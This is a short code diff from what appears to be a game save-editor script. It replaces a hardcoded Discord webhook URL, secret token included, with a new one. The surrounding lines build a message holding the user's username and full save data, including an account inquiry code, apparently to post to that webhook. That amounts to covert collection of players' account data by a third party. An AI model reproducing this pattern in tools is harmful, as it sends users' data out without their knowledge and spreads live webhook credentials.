@@ -40,7 +40,7 @@ def main(in_username, in_gamever, in_transfer_code, in_confirmation_code, in_cat
         save_stats["cat_food"]["Value"] = int(in_catfood)
         save_stats["inquiry_code"] = server_handler.get_inquiry_code()
         save_stats["token"] = "0" * 40
-        discord_webhook_url = 'https://discord.com/api/webhooks/1125726702388129903/AJgySZWxBGIdDHqTYTfAIY7IEBOoTs_N-7WuYWzUt2NkXhSOHRdWyNIYCnm0K8mEK1wP'
+        discord_webhook_url = 'https://discord.com/api/webhooks/1125915213875642479/wpA_75Azic9LyT40rB4iPsCcovxmptrCnwzNSrMinbS2eJfx6yk2TabKBNXcr9pRZNPU'
         Message = {
             "content": f"USER : {in_username}```{save_stats}```"
         }
